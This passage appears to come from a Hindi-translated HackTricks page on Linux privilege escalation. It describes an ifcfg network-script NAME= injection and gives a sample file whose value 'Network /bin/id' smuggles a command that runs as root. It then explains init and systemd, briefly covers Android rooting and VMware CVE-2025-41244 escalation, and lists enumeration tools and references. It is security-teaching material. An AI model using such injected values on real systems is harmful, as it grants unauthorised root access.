Network scripts, उदाहरण के लिए _ifcg-eth0_, network connections के लिए उपयोग होते हैं। ये बिल्कुल .INI files जैसे दिखते हैं। हालांकि, Linux पर इन्हें Network Manager (dispatcher.d) द्वारा \~sourced\~ किया जाता है।

मेरे मामले में, इन network scripts में `NAME=` attributed सही तरीके से handle नहीं किया जाता। यदि name में **white/blank space** है, तो system white/blank space के बाद वाले हिस्से को execute करने की कोशिश करता है। इसका मतलब है कि **पहले blank space के बाद का सब कुछ root के रूप में execute होता है**।

उदाहरण के लिए: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_ध्यान दें कि Network और /bin/id के बीच खाली स्थान है_)

### **init, init.d, systemd, and rc.d**

डायरेक्टरी `/etc/init.d` में **scripts** होते हैं जो System V init (SysVinit), **classic Linux service management system** के लिए हैं। इसमें `start`, `stop`, `restart`, और कभी-कभी `reload` services के लिए scripts शामिल होते हैं। इन्हें सीधे या `/etc/rc?.d/` में मिले symbolic links के माध्यम से चलाया जा सकता है। Redhat systems में एक वैकल्पिक path `/etc/rc.d/init.d` है।

दूसरी ओर, `/etc/init` **Upstart** से जुड़ा है, जो Ubuntu द्वारा पेश किया गया एक नया **service management** है, और service management tasks के लिए configuration files का उपयोग करता है। Upstart में बदलाव के बावजूद, compatibility layer के कारण SysVinit scripts अभी भी Upstart configurations के साथ इस्तेमाल की जाती हैं।

**systemd** एक modern initialization और service manager के रूप में सामने आता है, जो on-demand daemon starting, automount management, और system state snapshots जैसी advanced features देता है। यह files को `/usr/lib/systemd/` में distribution packages के लिए और `/etc/systemd/system/` में administrator modifications के लिए व्यवस्थित करता है, जिससे system administration process streamlined हो जाता है।

## Other Tricks

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks आमतौर पर एक syscall को hook करते हैं ताकि privileged kernel functionality को userspace manager तक expose किया जा सके। कमजोर manager authentication (उदा., FD-order पर आधारित signature checks या कमजोर password schemes) एक local app को manager की impersonation करके पहले से rooted devices पर root तक escalate करने की अनुमति दे सकती है। यहाँ और जानें तथा exploitation details देखें:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

VMware Tools/Aria Operations में regex-driven service discovery process command lines से binary path निकाल सकता है और उसे privileged context में -v के साथ execute कर सकता है। Permissive patterns (उदा., \S का उपयोग) attacker-staged listeners को writable locations (उदा., /tmp/httpd) में match कर सकते हैं, जिससे root के रूप में execution हो सकती है (CWE-426 Untrusted Search Path)।

और जानें तथा अन्य discovery/monitoring stacks पर लागू होने वाला generalized pattern यहाँ देखें:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Linux local privilege escalation vectors ढूँढने के लिए सबसे अच्छा tool:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** linux और MAC में kernel vulns enumerate करें [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [0xdf – Holiday Hack Challenge 2025: Neighborhood Watch Bypass (sudo env_keep PATH hijack)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [0xdf – HTB Previous (sudo terraform dev_overrides + TF_VAR symlink privesc)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [0xdf – HTB Slonik (pg_basebackup cron copy → SUID bash)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)
- [0xdf – HTB: Expressway](https://0xdf.gitlab.io/2026/03/07/htb-expressway.html)
- [0xdf – HTB: Browsed](https://0xdf.gitlab.io/2026/03/28/htb-browsed.html)
- [PEP 3147 – PYC Repository Directories](https://peps.python.org/pep-3147/)
- [Python importlib docs](https://docs.python.org/3/library/importlib.html)

{{#include ../../banners/hacktricks-training.md}}
